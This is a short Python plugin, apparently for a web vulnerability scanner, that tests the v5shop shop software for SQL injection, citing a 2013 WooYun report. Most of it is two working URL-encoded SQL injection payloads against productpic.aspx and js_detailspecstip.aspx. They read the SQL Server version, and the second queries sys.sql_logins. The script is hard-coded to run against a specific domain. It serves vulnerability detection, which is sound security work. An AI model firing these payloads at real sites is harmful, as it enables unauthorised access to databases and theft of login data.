#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '这个程序员不太冷'
#http://www.wooyun.org/bugs/wooyun-2013-043187
import re

def assign(service, arg):
    if service == "v5shop":
        return True, arg

def audit(arg):
    path1='productpic.aspx'
    payload1='?id=%28SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29'
    code, head, res, errcode, _ = curl.curl(arg + path1+payload1)
    if 'qvkvqMicrosoft SQL Server' in res:
            security_hole(arg+path1)
    path2='js_detailspecstip.aspx'
    payload2='?id=%28SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20sys.sql_logins%20WHERE%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%200%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20sys.sql_logins%20ORDER%20BY%20name%29%20ORDER%20BY%20name%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29'
    code,head,res, errcode, _ =curl.curl(arg+path2+payload2)
    if 'qvzbqMicrosoft SQL Server' in res:
            security_hole(arg+path2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('v5shop','http://ilikeulike.cn/')[1])
